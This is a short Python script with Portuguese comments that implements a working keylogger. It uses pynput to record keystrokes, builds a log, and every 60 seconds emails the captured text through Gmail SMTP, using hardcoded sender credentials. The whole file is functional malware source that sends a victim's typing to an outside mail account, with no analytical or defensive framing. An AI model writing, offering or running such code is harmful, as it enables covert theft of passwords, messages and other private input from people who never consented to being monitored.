from pynput import keyboard
import smtplib 
from email.mime.text import MIMEText   
from threading import Timer

log = ""

#configuraç~eos de email 
email_origem = "demokeylogger7777@gmail.com"
email_destino = "demokeylogger7777@gmail.com"
senha_email = "demologgerkey771@"

def enviarEmail(): 
    global log 
    if log: 
        msg = MIMEText (log)
        msg['SUBJECT'] = "Dados capturados pelo keylogger"
        msg['FROM'] = email_origem
        msg['To'] = email_destino

        try: 
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(email_origem, senha_email)
            server.send_message(msg)
            server.quit()
        except Exception as e: 
            print("Erro ao enviar", e)

        log = ""

    #agenda envio da mensagem 
    Timer(60, enviarEmail).start()

def onPress(key): 
    global log 
    try: 
        log+= key.char 
    except AttributeError: 
        if key == keyboard.Key.space: 
            log += " "
        elif key == keyboard.Key.enter: 
            log += "\n"
        elif key == keyboard.Key.backspace: 
            log += "[<]"
        else: 
            pass 

#inicia o keylogger e o envio automático 
with keyboard.Listener(on_press=onPress) as listener: 
    enviarEmail()
    listener.join()
